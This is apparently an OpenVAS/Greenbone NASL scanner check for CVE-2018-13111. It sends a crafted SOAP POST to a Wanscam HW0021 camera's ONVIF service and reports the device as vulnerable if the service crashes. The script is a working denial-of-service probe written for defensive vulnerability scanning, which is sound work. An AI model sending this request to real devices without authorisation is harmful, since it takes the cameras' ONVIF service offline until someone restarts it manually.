# SPDX-FileCopyrightText: 2018 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.113222");
  script_version("2023-07-21T05:05:22+0000");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2018-07-03 11:23:57 +0200 (Tue, 03 Jul 2018)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:N/A:P");
  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2018-11-09 21:44:00 +0000 (Fri, 09 Nov 2018)");

  script_tag(name:"qod_type", value:"remote_analysis");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_cve_id("CVE-2018-13111");

  script_name("Wanscam HW0021 ONVIF DoS Vulnerability");

  script_category(ACT_DENIAL);

  script_copyright("Copyright (C) 2018 Greenbone AG");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl", "httpver.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 8080);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"Wanscam HW0021 devices are prone to a partial denial of service
  (DoS) vulnerability.

  CAUTION: If the device is vulnerable, the ONVIF service will crash during the test.
  A manual restart of the service or the device will be necessary.");

  script_tag(name:"vuldetect", value:"Sends a crafted request via HTTP POST and checks whether
  the remote host stops responding.");

  script_tag(name:"insight", value:"An invalid SOAP-request to the ONVIF-SOAP interface will cause the ONVIF
  service to crash.");

  script_tag(name:"impact", value:"Successful exploitation would allow an attacker to deny users access to the
  ONVIF interface, until the service is manually restarted.");

  script_tag(name:"affected", value:"Wanscam HW0021. Other devices using ONVIF may be affected, too.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release,
  disable respective features, remove the product or replace the product by another one.");

  script_xref(name:"URL", value:"https://hackinganarchy.wordpress.com/2018/09/20/cve-2018-13111/");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("misc_func.inc");

port = http_get_port( default: 8080 );

res = http_get_cache( port: port, item: "/" );
if( ! res || res !~ 'www.onvif.org' )
  exit( 0 );

vtstrings = get_vt_strings();
req = http_post_put_req( port: port, url: "/", add_headers: make_array("SOAPAction", vtstrings["lowercase"] ) );

# We can't use receive here, because if vulnerable, the service will crash, and a receive would cause the VT to timeout.
soc = http_open_socket( port );
if( ! soc )
  exit( 0 );

send( socket: soc, data: req );
http_close_socket( soc );

soc = http_open_socket( port );
if( ! soc ) {
  report = "It was possible to crash the ONVIF service on the target device.";
  security_message( data: report, port: port );
  exit( 0 );
}

req = http_get_req( port: port, url: "/" );
send( socket: soc, data: req, length: strlen(req) );
answ = recv( socket: soc, length: 4096, timeout: 10 );
if( ! answ) {
  report = "It was possible to crash the ONVIF service on the target device.";
  security_message( data: report, port: port );
  exit( 0 );
}

exit( 99 );
